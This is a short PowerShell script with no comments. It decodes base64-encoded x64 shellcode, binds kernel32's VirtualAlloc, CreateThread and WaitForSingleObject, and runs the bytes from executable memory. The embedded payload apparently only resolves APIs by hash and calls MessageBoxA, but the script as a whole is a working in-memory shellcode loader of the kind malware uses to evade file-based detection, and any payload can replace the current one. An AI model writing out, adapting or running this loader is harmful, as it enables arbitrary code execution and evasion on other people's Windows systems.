$base64 = "VUiJ5UiD7Ci5jv4fS+gaAQAASIlF+EiLTfi6BoDoyOiXAAAASIlF8EiLTfi672LAH+iFAAAASIlF6EiNDUABAABIi33wSIPsKP/XSIPEKEiJReBIi03gSI0VLgEAAEiLfehIg+wo/9dIg8QoSIlF2EgxyUiNFQcBAABMjQULAQAARTHJSIPsKP/QSIPEKMNIMcBEigFBgPgAdB9BgPhBcgpBgPhadwRBgMggwcAHTQ+2wEwxwEgB0evYw4txPEiNNDGLtogAAABIjTQxi34gjTw5RItOJEaNDAlEiwdOjQQBV1FSVkyJwboBAAAA6J3///9eWllfSDnQdApIg8cESYPBAnXVZkWLSQJJgeH/DwAATWvJBEmD6QREi1YcTQHKTo0UEUWLEkqNBBHDZUiLPCVgAAAASIt/GEiLfxBIif5Mi0ZgQVBXVlFMicG6AgAAAOg5////WV5fQVhIOch0CEiLNkg5/nXYSItGMMOO/h9LBoDoyO9iwB8wgQV46YtMDHVzZXIzMi5kbGwATWVzc2FnZUJveEEA"
$bytes = [Convert]::FromBase64String($base64)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
}
"@

$addr = [K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$th = [K32]::CreateThread(0,0,$addr,0,0,0)
[K32]::WaitForSingleObject($th, 0xFFFFFFFF)